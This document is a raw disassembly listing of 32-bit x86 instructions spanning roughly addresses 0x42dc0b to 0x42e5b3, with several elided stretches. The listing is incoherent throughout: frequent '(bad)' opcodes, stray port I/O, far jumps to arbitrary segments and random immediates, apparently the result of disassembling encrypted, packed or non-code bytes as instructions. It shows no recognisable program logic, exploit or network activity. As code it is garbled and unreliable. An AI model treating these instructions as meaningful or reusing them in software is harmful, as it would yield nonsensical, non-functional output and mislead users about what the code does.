  42dc0b:	(bad)  
  42dc0c:	fdivp  st(3),st
  42dc0e:	fwait
  42dc0f:	and    al,0x95
  42dc11:	ja     0x42dbf5
  42dc13:	adc    WORD PTR [esi+0x41],cx
  42dc17:	mov    bl,0x42
  42dc19:	data16 adc BYTE PTR [edx-0x64],bh
  42dc1d:	aaa    
  42dc1e:	in     al,dx
  42dc1f:	lea    esi,[ebx+0x59]
  42dc22:	xchg   esi,eax
  42dc23:	sbb    al,0x31
  42dc25:	fdiv   QWORD PTR [ecx+0x12fa5016]
  42dc2b:	mov    eax,ds:0xb8309df5
  42dc30:	imul   BYTE PTR [edx]
  42dc32:	adc    al,0x73
  42dc34:	repnz xor dl,ch
  42dc37:	shl    DWORD PTR [esi],1
  42dc39:	mov    al,ss:0xa2c20abe
  42dc3f:	sbb    DWORD PTR [ebx+0x3526cdb4],ebp
  42dc45:	sub    ah,BYTE PTR [esi-0xc]
  42dc48:	pop    ecx
  42dc49:	cmp    bh,ah
  42dc4b:	pop    ebx
  42dc4c:	inc    edx
  42dc4d:	jmp    0x8077:0x47794b26
  42dc54:	bound  esi,QWORD PTR [eax-0x66]
  42dc57:	cmp    ebx,DWORD PTR [ebp-0xc094da3]
  42dc5d:	mov    es:0xa7e3e319,eax
  42dc63:	into   
  42dc64:	ror    ebx,0x7f
  42dc67:	xor    BYTE PTR [eax+ecx*1],bl
  42dc6a:	push   edi
  42dc6b:	mov    eax,0x5b6517e4
  42dc70:	mov    esi,0x1a6b56fc
  42dc75:	jne    0x42dc92
  42dc77:	repnz sbb ecx,DWORD PTR [esi-0x14]
  42dc7b:	mov    WORD PTR [edx],es
  42dc7d:	cmp    BYTE PTR [esi-0x481c8855],al
  42dc83:	fsub   st(4),st
  42dc85:	pop    ss
  42dc86:	fnstcw WORD PTR [eax-0x5e]
  42dc89:	sub    al,0xe
  42dc8b:	push   esp
  42dc8c:	leave  
  42dc8d:	int    0x6c
  42dc8f:	cmp    dh,BYTE PTR [edi+0x46]
  42dc92:	jbe    0x42dcb4
  42dc94:	cmp    BYTE PTR [edx+0x11],dl
  42dc97:	cmc    
  42dc98:	loope  0x42dc63
  42dc9a:	mov    al,ds:0xc1534fe6
  42dc9f:	sub    DWORD PTR [edi+0x3c],esp
  42dca2:	test   BYTE PTR [esi],bh
  42dca4:	sti    
  42dca5:	cmp    al,0x5a
  42dca7:	or     BYTE PTR [edi+0x3ef976dd],0x4d
  42dcae:	push   edi
  42dcaf:	das    
  42dcb0:	dec    ebx
  42dcb1:	pushf  
  42dcb2:	inc    edx
  42dcb3:	aad    0x69
  42dcb5:	adc    eax,DWORD PTR [edx]
  42dcb7:	daa    
  42dcb8:	adc    ecx,ecx
  42dcba:	retf   0xf079
  42dcbd:	push   ds
  42dcbe:	sbb    DWORD PTR [ebx-0x52],esp
  42dcc1:	sub    ch,BYTE PTR [eax-0x71]
  42dcc4:	loopne 0x42dd22
  42dcc6:	xor    ebx,DWORD PTR [ebx]
  42dcc8:	aam    0x66
  42dcca:	aad    0xa3
  42dccc:	xor    cl,BYTE PTR [ebx+0x42]
  42dccf:	(bad)  
  42dcd0:	xchg   ebp,eax
  42dcd1:	rol    DWORD PTR [eax+0x6c4e8956],cl
  42dcd7:	mov    eax,ds:0xbecb3574
  42dcdc:	jo     0x42dc91
  42dcde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dcdf:	out    dx,al
  42dce0:	inc    ecx
  42dce1:	daa    
  42dce2:	adc    BYTE PTR [ebx+0x1916315b],dh
  42dce8:	push   eax
  42dce9:	arpl   WORD PTR [eax+0x59607d],dx
	...
  42dd53:	add    BYTE PTR [eax],al
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	ja     0x42dd3a
  42dd64:	mov    cl,0xf6
  42dd66:	addr16 jmp 0x42dd6a
  42dd69:	add    BYTE PTR [eax],al
  42dd6b:	add    DWORD PTR [eax],eax
  42dd6d:	add    dh,ch
  42dd6f:	inc    esp
  42dd70:	int3   
  42dd71:	adc    DWORD PTR [edx-0x5f],esi
  42dd74:	sbb    eax,0xb1ae13a0
  42dd79:	sub    al,0xa1
  42dd7b:	mov    esp,0xfa189d36
  42dd80:	pop    eax
  42dd81:	dec    esp
  42dd82:	mov    ds:0x7d367bdd,eax
  42dd87:	mov    DWORD PTR [ebp+0x4b6a83af],ecx
  42dd8d:	fs repnz inc ecx
  42dd90:	in     eax,dx
  42dd91:	out    dx,al
  42dd92:	pusha  
  42dd93:	jnp    0x42dd83
  42dd95:	inc    eax
  42dd96:	sti    
  42dd97:	leave  
  42dd98:	cmp    bl,BYTE PTR [ecx+0x6980549d]
  42dd9e:	ja     0x42dda0
  42dda0:	push   cs
  42dda1:	and    edx,ebp
  42dda3:	call   0x46780bc5
  42dda8:	sub    al,0x34
  42ddaa:	pop    edx
  42ddab:	out    0xde,al
  42ddad:	pop    DWORD PTR [esi+0x3a]
  42ddb0:	and    al,0xad
  42ddb2:	xchg   edx,eax
  42ddb3:	mov    bh,BYTE PTR [edi+ebx*1]
  42ddb6:	mov    ebp,0xa0a26ffc
  42ddbb:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42ddbd:	and    dh,BYTE PTR [ecx+0x33bc157]
  42ddc3:	xchg   esp,eax
  42ddc4:	dec    esi
  42ddc5:	pop    esp
  42ddc6:	jecxz  0x42dd5c
  42ddc8:	aam    0x22
  42ddca:	or     ebp,DWORD PTR [edx-0x3b]
  42ddcd:	popf   
  42ddce:	jns    0x42dd67
  42ddd0:	stc    
  42ddd1:	inc    ecx
  42ddd2:	imul   BYTE PTR [edi]
  42ddd4:	mov    BYTE PTR [ecx+eax*1-0x3203fb3],bh
  42dddb:	push   0x8d0c2d53
  42dde0:	rcr    BYTE PTR [edx+0x62],1
  42dde3:	sub    DWORD PTR [eax+0x487610b0],edx
  42dde9:	aaa    
  42ddea:	sub    al,0x49
  42ddec:	lods   eax,DWORD PTR ds:[esi]
  42dded:	lods   al,BYTE PTR ds:[esi]
  42ddee:	stos   DWORD PTR es:[edi],eax
  42ddef:	mov    cl,0xf3
  42ddf1:	push   es
  42ddf2:	jno    0x42dda0
  42ddf4:	mov    DWORD PTR [esi],ebp
  42ddf6:	add    DWORD PTR [esi-0x313d4c9e],ebp
  42ddfc:	out    dx,al
  42ddfd:	into   
  42ddfe:	cmp    edi,esi
  42de00:	xor    cl,al
  42de02:	pop    eax
  42de03:	inc    eax
  42de04:	sub    DWORD PTR [esi+0x762568a4],eax
  42de0a:	sub    eax,0x7ad53796
  42de0f:	pop    ebx
  42de10:	dec    eax
  42de11:	icebp  
  42de12:	div    BYTE PTR [edx-0x4c528b62]
  42de18:	fucomi st,st(4)
  42de1a:	fcmovne st,st(5)
  42de1c:	retf   0xf276
  42de1f:	lahf   
  42de20:	dec    esi
  42de21:	push   ecx
  42de22:	jo     0x42de6e
  42de24:	mov    cl,0xc9
  42de26:	cmp    bl,BYTE PTR [ecx+0x77]
  42de29:	ja     0x42de24
  42de2b:	mov    gs,WORD PTR [ecx]
  42de2d:	loop   0x42de67
  42de2f:	loopne 0x42ddd6
  42de31:	aam    0xa5
  42de33:	mov    ebp,0x49a80bb5
  42de38:	jg     0x42de09
  42de3a:	stos   DWORD PTR es:[edi],eax
  42de3b:	iret   
  42de3c:	aas    
  42de3d:	inc    ebp
  42de3e:	jmp    0x7deb:0xd75ee336
  42de45:	pop    eax
  42de46:	push   esi
  42de47:	fwait
  42de48:	int    0x2a
  42de4a:	push   ecx
  42de4b:	dec    ebx
  42de4c:	inc    eax
  42de4d:	sub    eax,0x1af5e9c1
  42de52:	loopne 0x42de71
  42de54:	enter  0xebbc,0xd1
  42de58:	xor    BYTE PTR [ecx-0x6f88d944],ch
  42de5e:	nop
  42de5f:	sbb    si,bp
  42de62:	sbb    bh,BYTE PTR [esi-0x62]
  42de65:	scas   eax,DWORD PTR es:[edi]
  42de66:	dec    ebp
  42de67:	int3   
  42de68:	pop    ds
  42de69:	inc    esp
  42de6a:	popf   
  42de6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de6c:	xchg   esi,edx
	...
  42ded6:	out    0x82,al
  42ded8:	lods   eax,DWORD PTR ds:[esi]
  42ded9:	xor    ebp,ebp
  42dedb:	aas    
  42dedc:	(bad)  
  42dedd:	xlat   BYTE PTR ds:[ebx]
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	cli    
  42dee3:	in     al,0x22
  42dee5:	pop    ebp
  42dee6:	addr16 in al,dx
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	add    BYTE PTR [ecx],al
  42deec:	add    BYTE PTR [eax],al
  42deee:	adc    eax,0x7370b8d4
  42def3:	iret   
  42def4:	inc    edx
  42def5:	add    eax,0x44239059
  42defa:	jo     0x42df60
  42defc:	arpl   WORD PTR [eax+eax*1+0x6],dx
  42df00:	call   0x1f6dc6eb
  42df05:	fbld   TBYTE PTR [esi+0x41]
  42df08:	jb     0x42def9
  42df0a:	out    dx,eax
  42df0b:	stc    
  42df0c:	or     eax,0xcbb23464
  42df11:	js     0x42dec7
  42df13:	test   eax,0xcd76be8f
  42df18:	loop   0x42de9a
  42df1a:	push   edi
  42df1b:	ins    BYTE PTR es:[edi],dx
  42df1c:	jmp    0x42df3b
  42df1e:	jb     0x42df87
  42df20:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42df22:	jnp    0x42dee5
  42df24:	mov    bh,0xc7
  42df26:	int3   
  42df27:	inc    ecx
  42df28:	sub    DWORD PTR [edi],edi
  42df2a:	sbb    BYTE PTR [esi-0x74be635e],dh
  42df30:	sub    BYTE PTR [ebx+eax*8],ch
  42df33:	outs   dx,BYTE PTR ds:[esi]
  42df34:	(bad)  
  42df36:	jno    0x42deb8
  42df38:	arpl   WORD PTR [eax-0x6dd4def2],si
  42df3e:	mov    edi,0xe2073726
  42df43:	sub    bh,BYTE PTR [edi]
  42df45:	pop    ebp
  42df46:	dec    eax
  42df47:	dec    esi
  42df48:	call   DWORD PTR [eax+ecx*2]
  42df4b:	mulps  xmm6,XMMWORD PTR [edi+ecx*1]
  42df4f:	mov    BYTE PTR [ecx],al
  42df51:	cli    
  42df52:	pop    ebp
  42df53:	xor    eax,0xf4b8e62f
  42df58:	xor    eax,0x702a5936
  42df5d:	mov    bh,0xee
  42df5f:	pop    ecx
  42df60:	or     eax,0xe45817aa
  42df65:	sbb    BYTE PTR [edi+0x4777be46],al
  42df6b:	push   ss
  42df6c:	push   0x36
  42df6e:	pop    DWORD PTR [ebp-0x67d9ecc2]
  42df74:	xchg   DWORD PTR [eax],ebx
  42df76:	sbb    BYTE PTR [eax-0x41516bb4],0x8c
  42df7d:	and    ebx,DWORD PTR [edx]
  42df7f:	(bad)  
  42df80:	les    esi,FWORD PTR [eax]
  42df82:	lods   al,BYTE PTR ds:[esi]
  42df83:	mov    ebx,0xd9919ba1
  42df88:	ret    0xbc55
  42df8b:	sub    cl,BYTE PTR [ebx]
  42df8d:	xchg   edx,eax
  42df8e:	jmp    0xdfa5a2bc
  42df93:	ins    BYTE PTR es:[edi],dx
  42df94:	ins    DWORD PTR es:[edi],dx
  42df95:	mov    dl,bl
  42df97:	sub    al,bl
  42df99:	shl    DWORD PTR [ebx+0x6d],1
  42df9c:	jg     0x42df6f
  42df9e:	sub    dh,BYTE PTR [esi+ecx*1]
  42dfa1:	dec    eax
  42dfa2:	xlat   BYTE PTR ds:[ebx]
  42dfa3:	out    0x73,al
  42dfa5:	push   edx
  42dfa6:	and    edx,ebx
  42dfa8:	je     0x42df4f
  42dfaa:	sbb    al,ah
  42dfac:	pop    ebx
  42dfad:	fcomip st,st(0)
  42dfaf:	scas   eax,DWORD PTR es:[edi]
  42dfb0:	add    BYTE PTR [edx-0x6949f6],dh
  42dfb6:	mov    edx,0xc93d448d
  42dfbb:	test   DWORD PTR [edx-0x79],0x3a47e09c
  42dfc2:	sub    bl,BYTE PTR [ecx]
  42dfc4:	sbb    DWORD PTR [edx+0x42e68628],0xffffffde
  42dfcb:	out    dx,eax
  42dfcc:	cmc    
  42dfcd:	lock and BYTE PTR [ebp-0x11],dl
  42dfd1:	rcr    bh,1
  42dfd3:	or     al,0x1d
  42dfd5:	rcr    DWORD PTR [ecx+0x7b],cl
  42dfd8:	mov    ebx,0xc7bf70be
  42dfdd:	mov    ah,0x63
  42dfdf:	(bad)  
  42dfe0:	jbe    0x42e05e
  42dfe2:	or     al,0x6d
  42dfe4:	fdiv   QWORD PTR [ebp+0x58]
  42dfe7:	in     al,0x75
  42dfe9:	or     DWORD PTR [edx*4+0xffd7],esp
	...
  42e054:	add    BYTE PTR [eax],al
  42e056:	add    bh,dh
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x57]
  42e063:	sbb    ch,cl
  42e065:	dec    ecx
  42e066:	addr16 in eax,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	add    BYTE PTR [ecx],al
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	repz cmc 
  42e070:	mov    cl,0x54
  42e072:	push   ss
  42e073:	pop    eax
  42e074:	sti    
  42e075:	ins    DWORD PTR es:[edi],dx
  42e076:	pop    ds
  42e077:	rol    al,0xfe
  42e07a:	fs icebp 
  42e07c:	dec    DWORD PTR [ebx]
  42e07e:	push   ebx
  42e07f:	and    BYTE PTR [ebx],ch
  42e081:	icebp  
  42e082:	mov    cl,0xc2
  42e084:	lds    ebx,FWORD PTR ds:0x6b416f69
  42e08a:	es popa 
  42e08c:	xor    eax,0x5d3cf714
  42e091:	sbb    bl,bh
  42e093:	in     eax,0xec
  42e095:	and    al,0x47
  42e097:	les    eax,FWORD PTR ds:0xe5ccce2e
  42e09d:	popa   
  42e09e:	fstp   st(7)
  42e0a0:	push   edx
  42e0a1:	enter  0x5d5d,0x91
  42e0a5:	(bad)  
  42e0a6:	adc    DWORD PTR [edx-0x347d3f69],ebx
  42e0ac:	jp     0x42e0c2
  42e0ae:	pandn  mm0,mm2
  42e0b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0b2:	pop    esp
  42e0b3:	aam    0x9d
  42e0b5:	scas   eax,DWORD PTR es:[edi]
  42e0b6:	nop
  42e0b7:	cli    
  42e0b8:	inc    ebp
  42e0b9:	inc    edx
  42e0ba:	inc    edi
  42e0bb:	fst    st(6)
  42e0bd:	jmp    0x42e13c
  42e0bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0c0:	mov    DWORD PTR [ebp+0x32],edi
  42e0c3:	stc    
  42e0c4:	mov    DWORD PTR [ebx],ecx
  42e0c6:	adc    DWORD PTR [edx-0x57],esi
  42e0c9:	cld    
  42e0ca:	ficomp WORD PTR [ebx+0x7f]
  42e0cd:	(bad)
  42e0d1:	ja     0x42e0cc
  42e0d3:	jmp    0x42e0de
  42e0d5:	mov    esp,0xc3827b86
  42e0da:	adc    al,0xd0
  42e0dc:	adc    bh,BYTE PTR [esi-0x13]
  42e0df:	das    
  42e0e0:	inc    ebx
  42e0e1:	jg     0x42e12f
  42e0e3:	cmp    BYTE PTR [eax+0x25],al
  42e0e6:	push   edx
  42e0e7:	stos   BYTE PTR es:[edi],al
  42e0e8:	push   edi
  42e0e9:	jae    0x42e12c
  42e0eb:	or     eax,0xc6841217
  42e0f0:	fild   DWORD PTR [edi+0x2612f9d1]
  42e0f6:	mov    ds:0x5646d3f,al
  42e0fb:	xor    al,BYTE PTR [edx*4+0x5a0331db]
  42e102:	test   al,0xb0
  42e104:	jb     0x42e12a
  42e106:	jae    0x42e175
  42e108:	repnz mov edx,DWORD PTR [edi-0x6c041e69]
  42e10f:	push   es
  42e110:	je     0x42e17b
  42e112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e113:	jbe    0x42e18e
  42e115:	stos   BYTE PTR es:[edi],al
  42e116:	mov    esp,eax
  42e118:	ret    
  42e119:	into   
  42e11a:	shl    BYTE PTR [edx],0x4d
  42e11d:	cmp    ebx,0x20e2ceb4
  42e123:	pop    edx
  42e124:	leave  
  42e125:	call   0xae98:0x70d77503
  42e12c:	out    0x77,al
  42e12e:	leave  
  42e12f:	int    0x99
  42e131:	add    DWORD PTR [edx+0xe91d100],0xffffffc3
  42e138:	icebp  
  42e139:	mov    ebx,0x214dab5e
  42e13e:	jge    0x42e155
  42e140:	cmc    
  42e141:	push   ebx
  42e142:	imul   ebp,DWORD PTR [edx],0x41
  42e145:	lahf   
  42e146:	pop    eax
  42e147:	fbld   TBYTE PTR [esi-0x484c3a6c]
  42e14d:	and    BYTE PTR [ebx],al
  42e14f:	sub    al,0x4d
  42e151:	lods   al,BYTE PTR ds:[esi]
  42e152:	lods   al,BYTE PTR ds:[esi]
  42e153:	not    al
  42e155:	fs enter 0x8aa5,0x43
  42e15a:	sbb    bl,BYTE PTR [ebx+0x63a84332]
  42e160:	add    BYTE PTR [edx+ebx*4+0x40],cl
  42e164:	aas    
  42e165:	mov    dh,0xce
  42e167:	push   edx
  42e168:	xchg   DWORD PTR [esp+ebp*2+0x13cc50],edx
	...
  42e1d3:	add    BYTE PTR [eax],al
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	outs   dx,BYTE PTR ds:[esi]
  42e1e3:	out    0x60,eax
  42e1e5:	push   0x67
  42e1e7:	out    dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1ef:	pop    esi
  42e1f0:	ja     0x42e1dd
  42e1f2:	mov    al,ds:0xfb6e0396
  42e1f7:	enter  0x3a47,0xba
  42e1fb:	pushf  
  42e1fc:	cdq    
  42e1fd:	iret   
  42e1fe:	push   0x2eccde48
  42e203:	aas    
  42e204:	repz add ebp,DWORD PTR [ebp-0x3a4d6c4e]
  42e20b:	stos   DWORD PTR es:[edi],eax
  42e20c:	and    al,0xd8
  42e20e:	sub    esi,DWORD PTR [di+0x2585]
  42e213:	sahf   
  42e214:	ret    
  42e215:	mov    ds:0x2b0a1770,al
  42e21a:	and    esp,esi
  42e21c:	call   0xecf0c72f
  42e221:	shl    BYTE PTR [edx+0x27],1
  42e224:	mov    dl,0xf7
  42e226:	jecxz  0x42e260
  42e228:	out    dx,eax
  42e229:	adc    DWORD PTR [ecx],ebp
  42e22b:	jae    0x42e22e
  42e22d:	pop    ds
  42e22e:	push   ebx
  42e22f:	lds    ebp,FWORD PTR [esi-0x1f8caf52]
  42e235:	out    0x34,eax
  42e237:	jne    0x42e222
  42e239:	push   esp
  42e23a:	mov    ds:0xe9aae42e,eax
  42e23f:	mov    ecx,0x9506578e
  42e244:	sbb    edx,DWORD PTR [eax+0x29]
  42e247:	pop    DWORD PTR [ecx+0x6c907e96]
  42e24d:	inc    ebp
  42e24e:	push   ds
  42e24f:	jg     0x42e1d5
  42e251:	es xchg esi,eax
  42e253:	cmc    
  42e254:	dec    esp
  42e255:	mov    ds:0xba7dc9d5,eax
  42e25a:	clc    
  42e25b:	aad    0x1e
  42e25d:	adc    al,0xe6
  42e25f:	test   al,0x29
  42e261:	ret    0x7d96
  42e264:	mov    bh,0xda
  42e266:	pop    ebp
  42e267:	retf   0x6950
  42e26a:	test   BYTE PTR ds:0x9bf8c1b9,dh
  42e270:	fadd   DWORD PTR [ecx+0x4bb00351]
  42e276:	mov    al,ds:0xd08fa980
  42e27b:	dec    edi
  42e27c:	dec    eax
  42e27d:	push   ss
  42e27e:	mov    edx,ds
  42e280:	dec    ecx
  42e281:	adc    edx,esp
  42e283:	mov    ecx,0x95caaebb
  42e288:	adc    eax,0xe04220f9
  42e28d:	ss js  0x42e2de
  42e290:	scas   eax,DWORD PTR es:[edi]
  42e291:	scas   al,BYTE PTR es:[edi]
  42e292:	into   
  42e293:	test   BYTE PTR [edi],al
  42e295:	push   ds
  42e296:	popa   
  42e297:	and    eax,0x30c1aba0
  42e29c:	or     eax,0xff00b994
  42e2a1:	adc    al,0xfc
  42e2a3:	and    dl,BYTE PTR [edx+0x538df7f]
  42e2a9:	jmp    0x42e2f7
  42e2ab:	inc    ecx
  42e2ac:	or     eax,esi
  42e2ae:	xchg   BYTE PTR [eax+0x2b10ad93],dl
  42e2b4:	pop    ecx
  42e2b5:	and    dl,bh
  42e2b7:	mov    ds:0x332815b4,eax
  42e2bc:	(bad)  
  42e2bd:	cwde   
  42e2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2bf:	test   BYTE PTR [ebp+ebx*4-0x72],0x71
  42e2c4:	push   ecx
  42e2c5:	ss mov edi,0xf3e9859f
  42e2cb:	sahf   
  42e2cc:	loop   0x42e2be
  42e2ce:	and    bh,BYTE PTR [ebp+0x136cb0ec]
  42e2d4:	es int 0xf0
  42e2d7:	jl     0x42e291
  42e2d9:	fs and esi,ecx
  42e2dc:	scas   eax,DWORD PTR es:[edi]
  42e2dd:	jmp    DWORD PTR ds:0x947451c0
  42e2e3:	dec    eax
  42e2e4:	je     0x42e2d3
  42e2e6:	mov    al,ds:0xab8a4573
  42e2eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2ec:	mov    al,ds:0x1f
	...
  42e355:	add    BYTE PTR [ebp-0x655875c3],ch
  42e35b:	mov    bh,0xad
  42e35d:	aas    
  42e35e:	mov    ebx,0xd6199140
  42e363:	pop    esp
  42e364:	push   0xf
  42e366:	addr16 out dx,eax
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	xchg   ebx,eax
  42e36f:	sbb    BYTE PTR [ebx-0x69],dh
  42e372:	sar    BYTE PTR [edx-0x320d7767],cl
  42e378:	and    bh,ch
  42e37a:	scas   eax,DWORD PTR es:[edi]
  42e37b:	mov    ebp,ds
  42e37d:	(bad)  
  42e37e:	fisttp DWORD PTR [edi+0x382e4c70]
  42e384:	xchg   edx,eax
  42e385:	(bad)  
  42e386:	and    ah,BYTE PTR [edx]
  42e388:	popf   
  42e389:	xchg   ebx,eax
  42e38a:	and    al,0xd8
  42e38c:	push   eax
  42e38d:	iret   
  42e38e:	pop    ss
  42e38f:	mov    cl,0x8b
  42e391:	je     0x42e368
  42e393:	xor    BYTE PTR [eax],0xc3
  42e396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e397:	adc    al,0xe7
  42e399:	mov    ds:0x5f12806b,al
  42e39e:	jg     0x42e3d3
  42e3a0:	push   ebp
  42e3a1:	pop    ebx
  42e3a2:	inc    esp
  42e3a3:	mov    eax,ds:0x548b9648
  42e3a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3a9:	and    DWORD PTR [esi-0x13bf5d5],0xffffffb0
  42e3b0:	in     eax,0x56
  42e3b2:	sbb    esi,ecx
  42e3b4:	jae    0x6bafb5ba
  42e3ba:	mov    cs,esi
  42e3bc:	mov    cl,0x25
  42e3be:	adc    edx,DWORD PTR [ecx+0x20f0d159]
  42e3c4:	push   ebp
  42e3c5:	jbe    0x42e3b6
  42e3c7:	mov    dl,BYTE PTR [eax+0x930e4c1]
  42e3cd:	mov    edx,0x4c12bf2f
  42e3d2:	push   ss
  42e3d3:	out    0xf3,eax
  42e3d5:	dec    edi
  42e3d6:	cmp    ecx,DWORD PTR gs:[ecx]
  42e3d9:	out    0x8e,al
  42e3db:	xchg   edx,eax
  42e3dc:	xchg   ch,ch
  42e3de:	jae    0x42e365
  42e3e0:	xor    ebx,DWORD PTR [edx-0x49]
  42e3e3:	cmp    BYTE PTR [ecx],dh
  42e3e5:	push   ds
  42e3e6:	sbb    BYTE PTR [ebx-0x57],0x28
  42e3ea:	repz sbb al,0xae
  42e3ed:	arpl   WORD PTR [edx],cx
  42e3ef:	cmp    eax,0x90b9c93a
  42e3f4:	xchg   ecx,eax
  42e3f5:	add    al,0x9a
  42e3f7:	or     eax,0xc53154d1
  42e3fc:	outs   dx,BYTE PTR ds:[esi]
  42e3fd:	and    al,0xee
  42e3ff:	pop    ds
  42e400:	fs call 0x5beb:0xc3729598
  42e408:	fmul   QWORD PTR ds:0x15d50aeb
  42e40e:	or     al,0x62
  42e410:	test   DWORD PTR [ebx],ebp
  42e412:	mov    DWORD PTR [edx],ecx
  42e414:	stos   BYTE PTR es:[edi],al
  42e415:	(bad)  
  42e417:	adc    DWORD PTR [ecx+edx*2-0x7e],ecx
  42e41b:	repnz or ah,BYTE PTR [ecx+0x4]
  42e41f:	(bad)  
  42e420:	push   ebx
  42e421:	push   ss
  42e422:	cwde   
  42e423:	sbb    DWORD PTR [ebp+0x4e],edi
  42e426:	(bad)  
  42e427:	loop   0x42e3a9
  42e429:	pop    edi
  42e42a:	jno    0x42e427
  42e42c:	mov    eax,ds:0x5a7c3cd1
  42e431:	inc    esi
  42e432:	stos   BYTE PTR es:[edi],al
  42e433:	add    DWORD PTR [edi+0x4432f65c],ecx
  42e439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e43a:	mov    al,ds:0x794dca38
  42e43f:	or     ecx,esi
  42e441:	mov    ecx,0xdb8d51b8
  42e446:	je     0x42e402
  42e448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e449:	add    dh,ch
  42e44b:	mov    ah,0xf8
  42e44d:	test   DWORD PTR [ebp+eiz*2+0x9671ce7],eax
  42e454:	(bad)  
  42e456:	add    eax,0x9efe5ec7
  42e45b:	mov    ?,WORD PTR [ebp-0x57]
  42e45e:	or     eax,DWORD PTR [edi-0x44b4c4ac]
  42e464:	pop    esi
  42e465:	sahf   
  42e466:	std    
  42e467:	rol    BYTE PTR [esi+0x1a3ed601],1
  42e46d:	test   DWORD PTR [eax],eax
	...
  42e4d3:	add    BYTE PTR [eax],al
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	arpl   WORD PTR fs:[ecx+0x1f06739],bp
  42e4e9:	add    BYTE PTR [eax],al
  42e4eb:	add    DWORD PTR [eax],eax
  42e4ed:	add    bh,bh
  42e4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e4f0:	sbb    DWORD PTR [edi-0x249b9f37],ecx
  42e4f6:	mov    ch,0x8c
  42e4f8:	jne    0x42e4c5
  42e4fa:	push   ebx
  42e4fb:	test   BYTE PTR [ebp+0x2431cad1],bh
  42e501:	retf   
  42e502:	(bad)  [esi-0x2d44d63c]
  42e508:	rol    BYTE PTR [edi],1
  42e50a:	or     ecx,eax
  42e50c:	push   ss
  42e50d:	push   edi
  42e50e:	pop    ss
  42e50f:	sub    ebx,DWORD PTR [edx+0x3f]
  42e512:	mov    BYTE PTR [ebp+0x16],bh
  42e515:	pop    ecx
  42e516:	sub    eax,0x4f98daed
  42e51b:	sub    edx,0x79eb0f17
  42e521:	test   eax,esp
  42e523:	adc    ebp,DWORD PTR [esi]
  42e525:	cmp    cl,BYTE PTR [ebx+0x54]
  42e528:	data16 (bad) 
  42e52a:	loope  0x42e535
  42e52c:	push   ss
  42e52d:	and    BYTE PTR [eax-0x7f08a6e],al
  42e533:	inc    ebx
  42e534:	ret    
  42e535:	loop   0x42e4e5
  42e537:	js     0x42e52d
  42e539:	cwde   
  42e53a:	push   ebx
  42e53b:	jnp    0x42e4f3
  42e53d:	mov    edx,0x91950680
  42e542:	repz mov dl,0xad
  42e545:	cmc    
  42e546:	jo     0x42e542
  42e548:	mov    ch,0x7d
  42e54a:	inc    DWORD PTR [edx+0x53]
  42e54d:	loop   0x42e5c8
  42e54f:	retf   0xafa4
  42e552:	cmpxchg BYTE PTR [ecx-0xd78e270],bh
  42e559:	xor    al,0x63
  42e55b:	stos   BYTE PTR es:[edi],al
  42e55c:	ret    0x8ea4
  42e55f:	mov    ebp,eax
  42e561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e562:	das    
  42e563:	push   esp
  42e564:	push   ss
  42e565:	sub    al,0xc4
  42e567:	daa    
  42e568:	dec    edx
  42e569:	hlt    
  42e56a:	sbb    DWORD PTR [ecx+0x66b8cab0],eax
  42e570:	repnz mov eax,0xcf5e5771
  42e576:	mov    ah,0xa1
  42e578:	(bad)  
  42e579:	pop    edx
  42e57a:	mov    eax,0x3ddac5ca
  42e57f:	(bad)  
  42e580:	mov    eax,0xb36078a3
  42e585:	sub    bh,bl
  42e587:	xchg   ecx,eax
  42e588:	sub    al,0x81
  42e58a:	mov    bh,0x45
  42e58c:	push   ecx
  42e58d:	sbb    eax,0xf732cb47
  42e592:	mov    ah,0xfc
  42e594:	jb     0x42e539
  42e596:	retf   
  42e597:	sbb    eax,0x7aacf007
  42e59c:	ds dec ebp
  42e59e:	push   ebx
  42e59f:	dec    ebx
  42e5a0:	mov    ds:0xe7940c97,eax
  42e5a5:	sub    BYTE PTR [eax+0x73],cl
  42e5a8:	cs leave 
  42e5aa:	xchg   ecx,eax
  42e5ab:	icebp  
  42e5ac:	addr16 push esi
  42e5ae:	aam    0x13
  42e5b0:	cmc    
  42e5b1:	ret    
  42e5b2:	push   ds
  42e5b3:	daa    
